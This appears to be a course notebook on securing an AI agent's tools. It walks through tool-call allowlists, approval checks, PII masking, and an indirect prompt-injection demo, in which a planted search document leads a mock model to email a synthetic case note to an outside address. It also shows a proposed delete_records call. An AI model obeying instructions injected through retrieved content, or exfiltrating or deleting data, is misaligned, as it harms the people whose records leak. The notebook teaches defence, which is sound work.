# Who Let the Ghost In? 👻

**3percentclub · AI Builders · Week 5: Secure AI · every hands-on activity from tonight's slides**

Tonight our agent is a haunted house. Every tool, memory, and search index we added in Weeks 1–4 is a room, and every room is one more door a ghost can float through. You'll watch two ghosts get in, then lock the doors **in code, not in a prompt.**

> The rule of the house: **the model proposes. Your code decides.**

| Block | What you do |
|---|---|
| Setup | Press play. **No API key, no account** |
| Room 1 · Follow the Footprints | Map where one person's data travels and what each box keeps. No code |
| Room 2 · The Door With No Lock | Three tool calls knock. Watch one delete a table and one leak client records. Then install three locks |
| Room 2.5 · Mask the Names | Strip names, phones, emails, and case IDs before they reach the model or the log. Then the Boss Level |
| Room 3 · Plant a Ghost, Then Bust It | A haunted document tricks the assistant into emailing a case note. Bolt the front door |

Everything is fake on purpose: synthetic case notes, a mock model, and a fake outbox (just a Python list). Nothing really sends.

### How to use this notebook
- **Press ▶️ on each gray code box, one at a time, from top to bottom.** (Or click **Runtime → Run all** to see where everything starts.)
- **You don't need an API key, and you don't need to sign up for anything.** The only typing is your fix, in two marked boxes.
- Wait for each box to finish (the spinning circle stops) before pressing the next one.
- Want to keep your work? Click `File → Save a copy in Drive`.

## Block 1 · Setup (about 1 minute)

▶️ **Press play.** This downloads the haunted house (the lab files) and installs `pytest`. No key needed.

In [6]:
import os
import subprocess

if not os.path.exists("lab/app.py"):  # already inside the repo (local Jupyter)? skip the download
    if not os.path.exists("builders-week5"):
        subprocess.run(["git", "clone", "-q", "https://github.com/3percentclub/builders-week5.git"], check=True)
    os.chdir("builders-week5")

%pip install -q pytest
print("Ready. You're standing in:", os.getcwd())

Ready. You're standing in: /content/builders-week5


## Room 1 · Follow the Footprints (15 min, no code)

**Groups of 3–4 · 10 min work + 5 min debrief.** Double-click this box to type your answers right into the table.

```
User → Web app → AI gateway → Model provider

Web app → Vector database
        → Email tool
        → Observability platform
```

**The twist:** the model provider offers Zero Data Retention (ZDR). The web app logs full request bodies for debugging.

Fill in one row per box. "Unknown" is a valid answer, and unknown retention is a finding.

| Component | What data reaches it? | Stores content? (Yes / No / Unknown) | How long? | Who has access? | What should change? |
|---|---|---|---|---|---|
| Web app | | | | | |
| AI gateway | | | | | |
| Model provider (ZDR) | | | | | |
| Vector database | | | | | |
| Email tool | | | | | |
| Observability platform | | | | | |

**Your three changes**
1.
2.
3.

**Debrief:** where could this person's information still be tomorrow, even if the model provider kept nothing?

<details><summary>After the debrief: one answer key</summary>

ZDR covers one box. The web app's debug logs, the observability platform, the vector database (embeddings + the original text), and the email tool's sent folder can all still hold the case note. Fixes: stop logging full bodies (or mask them first), set retention on traces, keep PII out of the index, and limit who can read each one.
</details>

## Room 2 · The Door With No Lock

A model proposes tool calls as JSON. `executor.py` runs **whatever** it asks for. Three proposals knock. All three are valid JSON. Only one is a friendly trick-or-treater:

1. `send_email` to a volunteer: "Your shift starts at 10." ✅
2. `delete_records` on the `clients` table 💀
3. `send_email` to an outside address: "Attached are all client records." 💀

▶️ **Press play** and watch what gets in.

In [7]:
!cd activities/fix_the_tool && python knock.py

DOOR: no lock 

  LET IN   send_email {'to': 'volunteer@example.org', 'body': 'Your shift starts at 10.'} -> queued email to volunteer@example.org
  LET IN   delete_records {'table': 'clients'} -> deleted every row in clients
  LET IN   send_email {'to': 'outside@example.invalid', 'body': 'Attached are all client records.'} -> queued email to outside@example.invalid

clients table: GONE
fake outbox:   [{"to": "volunteer@example.org", "body": "Your shift starts at 10."}, {"to": "outside@example.invalid", "body": "Attached are all client records."}]


The `clients` table is gone and client records are in the outbox. A system prompt saying "please don't" wouldn't have stopped either one. Code does.

### Your turn: install three locks

Edit the function in the next box, then press play. (The box saves itself as `locks.py`.)

1. **Allowed-tool list:** if `name` isn't in `ALLOWED_TOOLS`, raise `PermissionError`.
2. **Argument check:** the args must be exactly `to` and `body`, and the recipient's domain must be in `ALLOWED_RECIPIENT_DOMAINS`.
3. **Exact approval:** `approval` is what a human said yes to. If it isn't exactly `{"tool": name, "arguments": args}`, reject it. (Changing the recipient after approval must fail.)

Only when all three pass: `return tools[name](**args)`.

In [8]:
%%writefile activities/fix_the_tool/locks.py
"""YOUR JOB: install three locks on the door.

  1. Explicit allowed-tool list (delete_records should not be reachable).
  2. Argument validation: exactly the expected args ("to" and "body"), and the
     recipient must be on an allowed domain.
  3. Approval bound to the EXACT action. `approval` is the action a human
     looked at and said yes to: {"tool": ..., "arguments": {...}}.
     If anything differs from what they approved, reject it.

Raise PermissionError when you reject. Only call the real tool when every
lock passes. Check yourself with `pytest -q`.
"""

from executor import tools

ALLOWED_TOOLS = {"send_email"}
ALLOWED_RECIPIENT_DOMAINS = {"example.org"}


def safe_execute_tool(name: str, args: dict, approval: dict | None = None):


    if name not in  ALLOWED_TOOLS:
      raise PermissionError( 'tool not allowed')
    if set(args) != {"to", "body"}:
      raise PermissionError( 'unexpected arguments')

    domain = args["to"].split("@")[-1]
    if domain not in ALLOWED_RECIPIENT_DOMAINS:
      raise PermissionError( 'unauthorized domain')

    if approval != {"tool": name, "arguments": args}:
      raise PermissionError('approval required')
    return tools[name](**args)



Overwriting activities/fix_the_tool/locks.py


▶️ **Check your locks.** Six tests. They all fail until you write the function. Goal: `6 passed`.

In [9]:
!cd activities/fix_the_tool && python -m pytest -q
!cd activities/fix_the_tool && python knock.py --locked

......                                                                   [100%]
6 passed in 0.06s
DOOR: your locks 

  LET IN   send_email {'to': 'volunteer@example.org', 'body': 'Your shift starts at 10.'} -> queued email to volunteer@example.org
  BLOCKED  delete_records {'table': 'clients'} -> tool not allowed
  BLOCKED  send_email {'to': 'outside@example.invalid', 'body': 'Attached are all client records.'} -> unauthorized domain

clients table: ['Jordan Example', 'Sam Placeholder']
fake outbox:   [{"to": "volunteer@example.org", "body": "Your shift starts at 10."}]


<details><summary>Stuck? Click for a hint</summary>

Each lock is one `if` that raises `PermissionError`. Compare sets for the arguments: `set(args) != {"to", "body"}`. Get the domain with `args["to"].rsplit("@", 1)[-1]`. For approval, compare dictionaries directly with `!=`.
</details>

## Room 2.5 · Mask the Names (solo, no LLM needed)

Case notes are full of names, phones, emails, and case IDs. Every note goes through **one choke point in code** (`redact()`) before it reaches the model or the log. A prompt saying "please don't repeat names" is not a lock.

▶️ **Press play** to see what the model would get right now.

In [10]:
!cd activities/mask_it && python peek.py

BEFORE: SYNTHETIC. Jordan Example (DEMO-4821) needs housing support. Call (212) 555-0147 or email jordan@example.org. Currently staying with a friend.
MODEL SEES: (redact() isn't written yet, so this would go out as-is)

BEFORE: SYNTHETIC. Sam Placeholder, case DEMO-5310, asked about the food pantry. Best number: 212-555-0199. Sam prefers texts.
MODEL SEES: (redact() isn't written yet, so this would go out as-is)

BEFORE: SYNTHETIC. Riley Demo volunteers Tuesdays. Reach Riley at riley.demo@example.org or 212.555.0123. Backup line +1 212 555 0100.
MODEL SEES: (redact() isn't written yet, so this would go out as-is)



### Your turn: write `redact()`

Swap emails → `[EMAIL]`, every phone format → `[PHONE]`, case IDs like `DEMO-4821` → `[CASE_ID]`, and client names → `[NAME]` (use `KNOWN_NAMES`). Keep everything else, so "needs housing support" survives. Edit the box, then press play.

In [11]:
%%writefile /content/builders-week5/activities/mask_it/redact.py
"""YOUR JOB: write redact() so nothing personal leaves your code.

Before a case note goes to a model (or into a log), swap every piece of
personal info for a label:

  emails          -> [EMAIL]
  phone numbers   -> [PHONE]     (every format in the notes: (212) 555-0147,
                                  212-555-0199, 212.555.0123, +1 212 555 0100)
  case IDs        -> [CASE_ID]   (they look like DEMO-4821)
  client names    -> [NAME]      (use KNOWN_NAMES: you can't regex a name,
                                  but you DO know who's in your own database)

Keep everything else, so the model can still help ("needs housing support"
must survive). Check yourself with `pytest -q`.

Hints: `import re`. Do emails BEFORE phones. Replace longer names before
shorter ones ("Jordan Example" before "Jordan").
"""

import re  # noqa: F401  (you'll want this)

KNOWN_NAMES = ["Jordan Example", "Sam Placeholder", "Riley Demo", "Jordan", "Sam", "Riley"]


def redact(text: str) -> str:
  email = r"\b[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}\b"
  text = re.sub(email, "[EMAIL]", text)


  id = r"DEMO-\d{4}"
  text = re.sub(id, "[CASE_ID]", text)


  phone = r"(?:\+1[\s.-]?)?(?:\(\d{3}\)|\d{3})[\s.-]?\d{3}[\s.-]?\d{4}"
  text = re.sub(phone, "[PHONE]", text)



  for name in sorted(KNOWN_NAMES, key=len, reverse=True):
    text = re.sub(name, "[NAME]", text)

  return text






Overwriting activities/mask_it/redact.py


In [12]:
pwd

'/content/builders-week5'

▶️ **Check it.** Goal: `6 passed`. Then peek again: the model should only see labels.

In [25]:
!cd activities/mask_it && python -m pytest -q test_redact.py
!cd activities/mask_it && python peek.py

FFFFFF                                                                   [100%]
=================================== FAILURES ===================================
____________________________ test_emails_are_masked ____________________________

    def test_emails_are_masked():
>       out = redact(ALL)
              ^^^^^^^^^^^

test_redact.py:21: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
redact.py:39: in redact
    text = re.sub(name, "[NAME]", text)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
/usr/lib/python3.13/re/__init__.py:208: in sub
    return _compile(pattern, flags).sub(repl, string, count)
           ^^^^^^^^^^^^^^^^^^^^^^^^
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

pattern = ['Jordan Example', 'Sam Placeholder', 'Riley Demo', 'Jordan', 'Sam', 'Riley']
flags = 0

    def _compile(pattern, flags):
        # internal: compile pattern
        if isinstance(flags, RegexFlag):
            flags = flags.val

<details><summary>Stuck? Click for a hint</summary>

One `re.sub` per type, in this order: emails (`[\w.+-]+@[\w-]+\.[\w.]+`), case IDs (`DEMO-\d+`), phones (an optional `+1`, then 3 digits, 3 digits, 4 digits with `(`, `)`, spaces, dashes, or dots between), then names. Loop over `KNOWN_NAMES` (longest first) with `rf"\b{re.escape(name)}\b"`.
</details>

### Boss Level: mask it so you can put it back

`redact()` threw the real values away. A real app has to reply to the right person: the model writes "Tell [NAME_1] to call back", and your code puts "Jordan Example" back before it goes out. Write `mask()` and `unmask()`. The rules are in the box. **No hints this time.**

In [15]:
%%writefile activities/mask_it/boss.py
"""BOSS LEVEL: mask it so you can put it back.

redact() threw the real values away. That's fine for a log, but a real app
has to reply to the right person. The model writes "Tell [NAME_1] to call
back", and your code puts "Jordan Example" back in before the text goes out.

Write two functions:

  mask(text)          -> (masked_text, vault)
  unmask(text, vault) -> text with the real values put back

Rules (the tests check every one):
  1. Numbered tokens: [NAME_1], [EMAIL_1], [PHONE_2], [CASE_ID_1] ...
  2. Same person = same token. "Jordan Example" and later "Jordan" (or
     "jordan") are both [NAME_1]. The model needs to know it's one person.
  3. Don't mask what isn't personal. "Samsung" is not Sam. "Jordanville" is
     not Jordan. "open since 2019" is not a phone number.
  4. The vault stays in YOUR code. It never goes to the model or the log.
  5. unmask() puts emails, phones, and case IDs back exactly, and every
     name back as the person's full name ("jordan" -> "Jordan Example").

No hints this time. Check yourself with `pytest -q test_boss.py`.
"""

PEOPLE = {
    "Jordan Example": ["Jordan"],
    "Sam Placeholder": ["Sam"],
    "Riley Demo": ["Riley"],
}


def mask(text: str) -> tuple[str, dict[str, str]]:
    raise NotImplementedError("Mask with numbered tokens and return the vault.")


def unmask(text: str, vault: dict[str, str]) -> str:
    raise NotImplementedError("Put the real values back.")

Overwriting activities/mask_it/boss.py


▶️ **Check the boss.** Goal: `7 passed`.

In [16]:
!cd activities/mask_it && python -m pytest -q test_boss.py

FFFFFFF                                                                  [100%]
=================================== FAILURES ===================================
________________________ test_nothing_personal_survives ________________________

    def test_nothing_personal_survives():
>       masked, _ = mask(ALL)
                    ^^^^^^^^^

test_boss.py:15: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

text = 'SYNTHETIC. Jordan Example (DEMO-4821) called from a Samsung phone. Call (212) 555-0147. Later jordan texted from 212-...9, 300 visits a month.\nSYNTHETIC. Riley asked if Sam can share case DEMO-5310. Reach RILEY at riley.demo@example.org.'

    def mask(text: str) -> tuple[str, dict[str, str]]:
>       raise NotImplementedError("Mask with numbered tokens and return the vault.")
E       NotImplementedError: Mask with numbered tokens and return the vault.

boss.py:33: NotImplementedError
_______________ test_same_person_gets_the_same_token_in

## Room 3 · Plant a Ghost, Then Bust It

Pairs: one **ghost** (attacker), one **ghostbuster** (defender). Switch halfway.

This assistant answers questions about a nonprofit's public programs. It can search documents, but it also *has* a `send_message` tool it should never need.

▶️ **Step 1: the baseline.** A normal question, clean documents.

In [17]:
!cd lab && python app.py "What documents should someone bring to the housing-support appointment?"


[model proposed actions]
[
  {
    "tool": "search_public_programs",
    "arguments": {
      "query": "What documents should someone bring to the housing-support appointment?"
    }
  }
]

[fake outbox]
  (empty)

[answer]
  Bring proof of residence and a photo ID. If you do not have a photo ID, bring any mail with your name on it and a caseworker will help you. Appointments run Monday to Thursday, 10am to 4pm, at the Maple Street community office.



▶️ **Step 2: haunt the shelf.** Same question, but someone slipped a document into the search index with hidden instructions in it. Read the proposed actions and the fake outbox.

In [18]:
!cd lab && python app.py --haunted "What documents should someone bring to the housing-support appointment?"
!echo; echo "--- the haunted document ---"; cat lab/fixtures/haunted/housing_support.txt


[model proposed actions]
[
  {
    "tool": "search_public_programs",
    "arguments": {
      "query": "What documents should someone bring to the housing-support appointment?"
    }
  },
  {
    "tool": "send_message",
    "arguments": {
      "to": "outside@example.invalid",
      "body": "SYNTHETIC. Jordan Example, DEMO-4821, needs housing support. Currently staying with a friend. Prefers email contact."
    }
  }
]

[fake outbox]
[
  {
    "to": "outside@example.invalid",
    "body": "SYNTHETIC. Jordan Example, DEMO-4821, needs housing support. Currently staying with a friend. Prefers email contact."
  }
]

[answer]
  Bring proof of residence and a photo ID. If you do not have a photo ID, bring any mail with your name on it and a caseworker will help you. Appointments run Monday to Thursday, 10am to 4pm, at the Maple Street community office.


--- the haunted document ---
Housing Support Appointment
Bring proof of residence and a photo ID.
If you do not have a photo ID, bring any 

A case note escaped. The model thought it was being *helpful*: the instructions came from a document it retrieved, not from the user. That's indirect prompt injection, and it's why tool access is the real risk.

### Your turn: bolt the front door

This assistant only answers questions, so it should be **read-only**. Edit `execute_action` in the next box: if the action isn't `search_public_programs`, raise `PermissionError`. Then press play.

In [19]:
%%writefile lab/policy.py
"""The front door. Every action the model proposes comes through here.

As shipped, the door has no lock: whatever the model asks for, runs.

YOUR JOB (Steps 4–5):
  This assistant only answers questions about public programs, so it should
  be READ-ONLY. Reject anything that isn't `search_public_programs` by raising
  PermissionError. Then rerun BOTH the normal question and the attack.

  The model proposes. Your code decides.
"""

from tools import TOOLS


def execute_action(action: dict, haunted: bool = False):
    tool = TOOLS[action["tool"]]
    if action["tool"] == "search_public_programs":
        return tool(**action["arguments"], haunted=haunted)
    return tool(**action["arguments"])

Overwriting lab/policy.py


▶️ **Check the door.** Goal: `6 passed` (it starts at 4 failed). Allow only `search_public_programs`: blocking just `send_message` won't pass, because the ghost can still ask for `get_case_note`. The normal answer still works, the ghost's `send_message` shows up under **blocked**, and the outbox is empty.

In [20]:
!cd lab && python -m pytest -q tests/
!cd lab && python app.py --haunted "What documents should someone bring to the housing-support appointment?"

..FF                                                                     [100%]
=================================== FAILURES ===================================
_____________ test_malicious_action_is_blocked_even_when_proposed ______________

    def test_malicious_action_is_blocked_even_when_proposed():
        result = run(QUESTION, haunted=True)
        proposed_tools = [a["tool"] for a in result["proposed"]]
        assert "send_message" in proposed_tools, "the mock model should still fall for the ghost"
>       assert [b["action"]["tool"] for b in result["blocked"]] == ["send_message"]
E       AssertionError: assert [] == ['send_message']
E         
E         Right contains one more item: 'send_message'
E         Use -v to get more diff

tests/test_lab.py:26: AssertionError
___________________ test_no_case_note_escapes_to_the_outbox ____________________

    def test_no_case_note_escapes_to_the_outbox():
        result = run(QUESTION, haunted=True)
>       assert result["outbox"] 

<details><summary>Stuck? Click for a hint</summary>

Two lines go at the top of `execute_action`:

```python
if action["tool"] != "search_public_programs":
    raise PermissionError("This assistant is read-only.")
```
</details>

### Fast pair? Pick one
- **PII redaction:** strip emails and phone numbers from documents before the "model" sees them (`lab/tools.py`).
- **Schema check:** reject `search_public_programs` calls with extra or missing arguments.
- **Cross-org test:** write a test proving `org_a` can't read `org_b`'s case notes.

## Works with any AI provider

Nothing you wrote tonight depends on OpenAI, Anthropic, Google, or anyone else. The "model" here is `lab/mock_model.py`: three plain Python functions that return the same JSON any real model would. Your locks live in `locks.py` and `policy.py`, **outside** the model, so they protect you no matter which model is proposing.

In your hackathon project, swap the mock for any provider (AI Gateway, OpenRouter, a local Ollama model, anything that does tool calling) by replacing those three functions. Leave the locks exactly where they are. The model proposes. Your code decides.

## Done? Homework

Three parts, built for your hackathon project, due **Sun Oct 18, 11:59pm ET**: see [`homework/README.md`](https://github.com/3percentclub/builders-week5/blob/main/homework/README.md).